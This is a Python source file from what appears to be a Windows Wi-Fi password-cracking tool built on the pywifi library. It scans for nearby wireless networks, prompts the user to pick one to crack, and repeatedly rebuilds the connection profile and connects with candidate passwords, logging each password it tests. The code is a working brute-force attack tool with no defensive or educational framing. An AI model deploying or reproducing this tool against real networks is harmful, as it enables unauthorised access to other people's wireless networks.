# --*--coding:utf-8--*--

__AUTHOR__ = "Master_LXJ"
__DOC__ = "The dream more than endlessly!"

import pywifi
from pywifi._wifiutil_win import WifiUtil
from ctypes import *
from utils import timer,loger


class WiFi(WifiUtil):

    def __init__(self):
        """
        初始化配置
        """
        super(WiFi, self).__init__()
        self.wifi = pywifi.PyWiFi()
        self.profile = pywifi.Profile()
        self.const = pywifi.const
        self.iface = self.GetInterface()
        self.Profile = {}

    def GetInterface(self):
        """
        选择网卡
        :return:网卡
        """
        ifaces = self.wifi.interfaces()
        if len(ifaces) == 0:
            loger("*"*10+"未发现网卡,请重试!"+"*"*10+"\n")
            return None

        elif len(ifaces) == 1:
            return ifaces[0]

        else:
            loger("%-3s | %-6s"%("序号", "网卡"))
            for index, name in enumerate(ifaces):
                loger("%-1s | %-2s \n"%(index+1, name))
            iface_num = int(input("发现多个网卡,请选择无线网卡(输入网卡序号) :"))

            return ifaces[iface_num-1]

    def StartScan(self, ssid):
        """
        扫描WIFI
        :param ssid:表示状态用
        :return:
        """
        if ssid is None:
            loger("*" * 10 + "正在扫描无线网络" + "*" * 10 + "\n")
        else:
            pass
        self.iface.scan()
        obj = len(self.iface.scan_results()) > 0
        timer(2, obj)

    def GetScanResults(self):
        """
        获取扫描结果
        :return: 扫描结果
        """
        results = self.iface.scan_results()

        return results

    def MakeProfile(self, password):
        """
        生成WiFi配置
        :param password: 密码
        :return:
        """
        assert len(password) >= 8
        self.profile.ssid = self.Profile["ssid"]
        self.profile.auth = self.Profile["auth"]
        self.profile.akm = self.Profile["akm"]
        self.profile.cipher = self.Profile["cipher"]
        self.profile.key = password

    def Connect(self, password):
        """
        连接WiFi
        :param password: 密码
        :return:
        """
        self.MakeProfile(password)
        self.iface.disconnect()
        self.remove_network_profile(self.iface._raw_obj, self.profile.ssid)
        temp_profile = self.iface.add_network_profile(self.profile)
        self.iface.connect(temp_profile)
        obj = self.GetStatus() == self.const.IFACE_CONNECTED
        loger("当前破解的WIFI: {}  测试密码: {}".format(self.profile.ssid, password))
        timer(2, obj)

    def GetStatus(self):
        """
        获取WiFi状态
        :return: WiFi状态
        """
        status = self.iface.status()

        return status

    def remove_network_profile(self, obj, name):
        """
        这个方法是拓展了pywifi库,用于删除特定的WiFi配置
        :param obj: WLAN对象
        :param name: ssid
        :return:
        """
        profile_name_list = super().network_profile_name_list(obj)

        for profile_name in profile_name_list:
           if name == profile_name:
               super()._logger.debug("delete profile: %s", profile_name)
               str_buf = create_unicode_buffer(profile_name)
               ret = super()._wlan_delete_profile(super()._handle, obj['guid'], str_buf)
               super()._logger.debug("delete result %d", ret)
           else:
               pass

    def choose_ap(self, APs, ssid):
        """
        选择要破解的WiFi
        :param APs:所有扫描到的WiFi
        :param ssid: ssid
        :return:
        """
        bssids = []
        aps = []
        global ap_num
        if ssid is None:
            loger("*" * 10 + "扫描到以下无线网络" + "*" * 10 + "\r")
            loger("%-2s    %-10s    %-10s    %-6s    %-10s  " % ("编号", "名称", "信号(绝对值越小,信号越强)", "加密方式", "MAC地址") + "\r")
            loger("- -" * 35)
            for index, ap in enumerate(APs):
                ap.ssid = "隐藏的网络" if len(ap.ssid) == 0 else ap.ssid
                if ap.bssid not in bssids:
                    loger("%-2s  |  %-25s  |  %-3s  |  %-6s  |  %-10s  " % (index + 1, ap.ssid, ap.signal, self.akm_int_to_str(ap.akm), ap.bssid))
                    bssids.append(ap.bssid)
                    aps.append(ap)
                else:
                    pass

            ap_num = int(input("- -" * 25 + "\n选择需要破解的WiFi编号(推荐选择信号值大于-60的) :"))
        else:
            for index, ap in enumerate(APs):
                if ap.ssid in ssid:
                    ap_num = index+1

        self.Profile["ssid"] = APs[ap_num-1].ssid
        self.Profile["auth"] = APs[ap_num-1].auth
        self.Profile["akm"] = APs[ap_num-1].akm
        self.Profile["cipher"] = self.const.CIPHER_TYPE_CCMP


    def akm_int_to_str(self, akm):
        """
        转换加密方式形态
        :param akm: 加密方式
        :return:
        """
        akms = [
            "AKM_TYPE_NONE",
            "AKM_TYPE_WPA",
            "AKM_TYPE_WPAPSK",
            "AKM_TYPE_WPA2",
            "AKM_TYPE_WPA2PSK",
            "AKM_TYPE_UNKNOWN"
        ]

        return akms[akm[0]]

